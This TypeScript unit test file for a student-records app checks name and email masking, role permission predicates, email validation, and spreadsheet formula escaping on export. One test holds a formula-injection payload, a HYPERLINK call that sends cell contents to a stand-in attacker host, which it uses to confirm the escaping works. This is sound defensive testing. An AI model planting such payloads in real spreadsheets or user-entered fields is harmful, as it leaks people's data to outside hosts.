import { describe, it, expect } from "vitest";
import { maskName, maskEmail, maskHandle } from "@/lib/mask";
import { optionalEmail } from "@/lib/validation";
import { __test as wbTest } from "@/lib/report-workbook";
import { canAdminister, canManageStudents, canViewAllClassrooms } from "@/lib/authz";

/*
  These cover the boundaries the audit flagged as untested: PII masking on the
  public student pages, the capability predicates that gate every server
  function, the shared email schema, and spreadsheet formula escaping on export.

  Everything here is pure. The parts of authz.ts that talk to Postgres
  (accessibleClassroomIds, assertStudentAccess, resolveRole) need a live database
  or a Supabase fake and are deliberately out of scope for this file — they are
  the next thing worth covering.
*/

// ════════════════════════════════════════════════════════════════════════════
describe("mask", () => {
  it("reduces a full name to first name + last initial", () => {
    expect(maskName("Aarav Sharma")).toBe("Aarav S.");
    expect(maskName("  Priya   Raj  Kumar ")).toBe("Priya K.");
  });

  it("returns a placeholder for empty input rather than throwing", () => {
    expect(maskName(null)).toBe("—");
    expect(maskName(undefined)).toBe("—");
    expect(maskName("   ")).toBe("—");
  });

  it("KNOWN GAP: a single-word name is returned completely unmasked", () => {
    // Documented rather than asserted-as-correct. There is no last name to
    // reduce to an initial, so the function returns the input verbatim — which
    // means mononymous students get no masking at all on the public profile.
    // Pinned as a test so the behaviour is a decision, not a surprise.
    expect(maskName("Madonna")).toBe("Madonna");
  });

  it("keeps the email domain but hides the local part", () => {
    expect(maskEmail("aarav.sharma@demo.edu")).toBe("aa•••@demo.edu");
    expect(maskEmail("x@demo.edu")).toBe("x•••@demo.edu");
    expect(maskEmail(null)).toBeNull();
  });

  it("does not leak a local part when the address has no @", () => {
    expect(maskEmail("not-an-email")).toBe("•••");
    // A leading @ means there is no local part to keep.
    expect(maskEmail("@demo.edu")).toBe("•••");
  });

  it("keeps a handle recognisable without making it resolvable", () => {
    expect(maskHandle("aarav_sharma")).toBe("aa•••ma");
    expect(maskHandle("abcd")).toBe("a•••");
    expect(maskHandle("ab")).toBe("a•••");
    expect(maskHandle(null)).toBe("—");
  });
});

// ════════════════════════════════════════════════════════════════════════════
describe("authz capability predicates", () => {
  it("restricts administration to admin alone", () => {
    expect(canAdminister("admin")).toBe(true);
    for (const r of ["faculty", "placement_officer", "ceo", null] as const) {
      expect(canAdminister(r)).toBe(false);
    }
  });

  it("lets admin and faculty manage students, but not PO or CEO", () => {
    expect(canManageStudents("admin")).toBe(true);
    expect(canManageStudents("faculty")).toBe(true);
    // A placement officer sees everything and edits nothing — this asymmetry is
    // intentional and is exactly the kind of thing that drifts silently.
    expect(canManageStudents("placement_officer")).toBe(false);
    expect(canManageStudents("ceo")).toBe(false);
    expect(canManageStudents(null)).toBe(false);
  });

  it("gives cross-classroom visibility to admin and placement officer", () => {
    expect(canViewAllClassrooms("admin")).toBe(true);
    expect(canViewAllClassrooms("placement_officer")).toBe(true);
    // A CEO is scoped by college_assignments, not granted blanket visibility.
    expect(canViewAllClassrooms("ceo")).toBe(false);
    expect(canViewAllClassrooms("faculty")).toBe(false);
    expect(canViewAllClassrooms(null)).toBe(false);
  });

  it("denies every capability to a user with no role", () => {
    expect(canAdminister(null)).toBe(false);
    expect(canManageStudents(null)).toBe(false);
    expect(canViewAllClassrooms(null)).toBe(false);
  });
});

// ════════════════════════════════════════════════════════════════════════════
describe("optionalEmail", () => {
  it("accepts the three ways of saying 'no email'", () => {
    expect(optionalEmail.parse(undefined)).toBeUndefined();
    expect(optionalEmail.parse(null)).toBeNull();
    expect(optionalEmail.parse("")).toBe("");
  });

  it("accepts a valid address and trims it", () => {
    expect(optionalEmail.parse("  a@b.edu  ")).toBe("a@b.edu");
  });

  it("rejects a malformed address on every path", () => {
    // The bulk-import and single-add paths used to disagree about this: the form
    // validated the format, the spreadsheet importer accepted any string.
    expect(() => optionalEmail.parse("not-an-email")).toThrow();
    expect(() => optionalEmail.parse("a@")).toThrow();
    expect(() => optionalEmail.parse("@b.edu")).toThrow();
  });

  it("rejects an over-long value", () => {
    expect(() => optionalEmail.parse(`${"a".repeat(200)}@b.edu`)).toThrow();
  });
});

// ════════════════════════════════════════════════════════════════════════════
describe("workbook formula escaping", () => {
  const { deFormula } = wbTest;

  it("neutralises every formula-triggering lead character", () => {
    // Excel, LibreOffice and Sheets all execute these.
    expect(deFormula("=1+1")).toBe("'=1+1");
    expect(deFormula("+1")).toBe("'+1");
    expect(deFormula("-1")).toBe("'-1");
    expect(deFormula("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(deFormula("\tcmd")).toBe("'\tcmd");
    expect(deFormula("\rcmd")).toBe("'\rcmd");
  });

  it("neutralises a realistic exfiltration payload in a student name", () => {
    const payload = '=HYPERLINK("http://evil.test/?"&A1,"Click")';
    expect(deFormula(payload)).toBe(`'${payload}`);
  });

  it("leaves ordinary values untouched", () => {
    expect(deFormula("Aarav Sharma")).toBe("Aarav Sharma");
    expect(deFormula("24CS001")).toBe("24CS001");
    // A negative NUMBER is not a string and must not gain a quote, or the cell
    // stops being numeric and every downstream SUM in the report breaks.
    expect(deFormula(-5)).toBe(-5);
    expect(deFormula(0)).toBe(0);
    expect(deFormula(null)).toBeNull();
    expect(deFormula("")).toBe("");
  });
});
